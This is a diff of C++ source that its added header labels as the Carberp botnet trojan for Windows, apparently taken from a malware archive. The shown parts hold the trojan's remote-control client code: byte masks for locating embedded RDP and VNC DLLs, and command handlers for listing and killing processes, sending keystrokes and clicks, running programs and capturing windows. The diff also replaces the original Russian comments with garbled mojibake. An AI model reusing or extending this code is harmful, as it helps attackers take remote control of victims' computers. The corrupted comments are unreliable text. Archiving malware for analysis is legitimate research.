@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 #include <winsock2.h>
 #include <windows.h>
@@ -20,16 +31,16 @@ LPBYTE GetDll(BYTE *lpData,DWORD dwSize,DWORD Beb,DWORD *Sise)
     return Data1;
 }
 
-//для каждого файла заведем свой namespace, дабы не извращаться с именами переменных
-//и автоматизировать работу bin2hex.exe
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ namespace, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ bin2hex.exe
 
-//ничего автоматизировать не нужно, так как в файле vnc.h стоит маска по которой будет находится нужная
-//область памяти в которую будет ложиться файл с помощью внешней утилиты
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ vnc.h пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 namespace RDP
 {
-	//маска по которой находим данный массив
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	unsigned char mask[] = { 0x15, 0x26, 0x37, 0x48, 0x59, 0x6a, 0x7b, 0x8c };
-	//размер вложенного файла
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	unsigned char size[] = { 0, 0, 0, 0, 1, 1, 1, 1 };
 #ifndef WITHOUT_VNC
 	#include "../DLLs/RDP.h"
@@ -39,9 +50,9 @@ namespace RDP
 }
 namespace VNC
 {
-	//маска по которой находим данный массив
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	unsigned char mask[] = { 0x12, 0x21, 0x34, 0x43, 0x56, 0x65, 0x78, 0x87 };
-	//размер вложенного файла
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	unsigned char size[] = { 0, 0, 0, 0, 1, 1, 1, 1 };
 
 #ifndef WITHOUT_VNC
@@ -443,8 +454,8 @@ int CClient::NotificationFromType( int type )
 		case PK_CS_DRIVERLIST:			return PM_CLIENT_DRIVERLIST;
 		case PK_CS_WINLIST:				return PM_CLIENT_WINDOW_LIST;
 		case PK_CS_WINSHOT:				return PM_CLIENT_WINDOW_SHOT;
-		case PK_CS_PROCESSLIST:			return PM_CLIENT_PROCESSLIST;			//получаем список процессов
-		case PK_CS_KILLPROCESSFROMLIST:	return PM_Client_KILLPROCESSFROMLIST;	//мочим процесс
+		case PK_CS_PROCESSLIST:			return PM_CLIENT_PROCESSLIST;			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		case PK_CS_KILLPROCESSFROMLIST:	return PM_Client_KILLPROCESSFROMLIST;	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		case PK_CS_LEFTCLICK:			return PM_CLIENT_LCLICK_CONFIRMED;
 		case PK_CS_KEYS:				return PM_CLIENT_KEYS_CONFIRMED;
 		case PK_CS_RUN:					return PM_CLIENT_RUN_CONFIRMED;
@@ -591,7 +602,7 @@ void CClient::RequestWindowList()
 	m_TransactionLock.Unlock();
 }
 
-void CClient::RequestNamesControl(DWORD_PTR idWindow)////должно вернуть имена контролов
+void CClient::RequestNamesControl(DWORD_PTR idWindow)////пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 {
 	m_TransactionLock.Lock();
 
